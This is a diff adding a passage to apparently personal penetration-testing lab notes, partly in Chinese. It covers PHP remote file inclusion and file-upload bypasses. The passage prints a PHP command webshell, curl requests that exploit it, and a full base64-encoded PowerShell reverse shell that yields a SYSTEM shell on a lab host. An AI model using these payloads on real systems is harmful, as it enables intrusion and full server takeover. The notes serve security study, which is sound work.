@@ -1183,3 +1183,116 @@ Bypass WAF, we can try to use the data:// wrapper with base64-encoded data.
 >[!Tip]
 > `data://` wrapper will not work in a default PHP installation. To exploit it, the **[allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php#ini.allow-url-include)** setting needs to be `enabled`.
 
+### 3. Remote File Inclusion (RFI)
+RFI vulnerabilities allow us to include files from a remote system over HTTP or SMB.\
+Kali Linux includes several PHP webshells in the `/usr/share/webshells/php/` directory that can be used for RFI.
+```
+┌──(chw㉿CHW-kali)-[/usr/share/webshells/php/]
+└─$ cat simple-backdoor.php
+...
+<?php
+if(isset($_REQUEST['cmd'])){
+        echo "<pre>";
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        echo "</pre>";
+        die;
+}
+?>
+
+Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
+...
+```
+```
+┌──(chw㉿CHW-kali)-[/usr/share/webshells/php/]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+┌──(chw㉿CHW-kali)-[/usr/share/webshells/php/]
+└─$ curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.119.3/simple-backdoor.php&cmd=ls"
+...
+<a href="index.php?page=admin.php"><p style="text-align:center">Admin</p></a>
+<!-- Simple PHP backdoor by DK (http://michaeldaw.org) --> 
+
+<pre>admin.php
+bavarian.php
+css
+fonts
+img
+index.php
+js
+</pre> 
+```
+
+## File Upload Vulnerabilities
+File Upload vulnerabilities into three categories:
+- Upload files that are executable by the web application
+> upload a PHP script
+- Combine the file upload mechanism with another vulnerability, such as Directory Traversal
+> If the web application is vulnerable to Directory Traversal, we can use a relative path in the file upload request and try to overwrite files like authorized_keys. Furthermore, we can also combine file upload mechanisms with XML External Entity (XXE) or Cross Site Scripting (XSS) attacks.
+- Relies on user interaction
+> When we discover an upload form for job applications, we can try to upload a CV in .docx4 format with malicious macros5 integrated.
+
+### 1. Using Executable Files
+Bypass:\
+(1) PHP file extension2 such as `.phps` or `.php7`.\
+(2) changing characters in the file extension to `upper case`
+(3) [HackTriacks: File Upload General Methodology](https://book.hacktricks.xyz/pentesting-web/file-upload)
+ 
+>[!Note]
+> PowerShell 中實現了一個簡單的 Reverse Shell
+> ```
+> ┌──(chw㉿CHW-kali)-[/]
+> └─$ pwsh
+>PowerShell 7.1.3
+>Copyright (c) Microsoft Corporation.
+>
+>https://aka.ms/powershell
+>Type 'help' to get help.
+>
+>PS> $Text = '$client = New-Object >System.Net.Sockets.TCPClient("192.168.1>19.3",4444);$stream = $client.GetStream();[byte[]]$bytes = >0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) >-ne 0){;$data = (New-Object -TypeName >System.Text.ASCIIEncoding).GetString($b>ytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+>
+>
+>PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+>
+>PS> $EncodedText =[Convert]::ToBase64String($Bytes)
+>
+>PS> $EncodedText
+>JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+>...
+>AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHU>AcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+>
+>
+>PS> exit
+> ```
+
+![image](https://hackmd.io/_uploads/HJPAlhhGyg.png)
+![image](https://hackmd.io/_uploads/rkrbWnhfkg.png)
+
+以上為了製造 Windows 環境的 PowerShell payload
+    
+```
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0
+...
+AYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
+
+┌──(chw㉿CHW-kali)-[/]
+└─$ curl  nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.119.3] from (UNKNOWN) [192.168.50.189] 50603
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 2:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.50.189
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.50.254
+
+PS C:\xampp\htdocs\meteor\uploads> whoami
+nt authority\system
+```
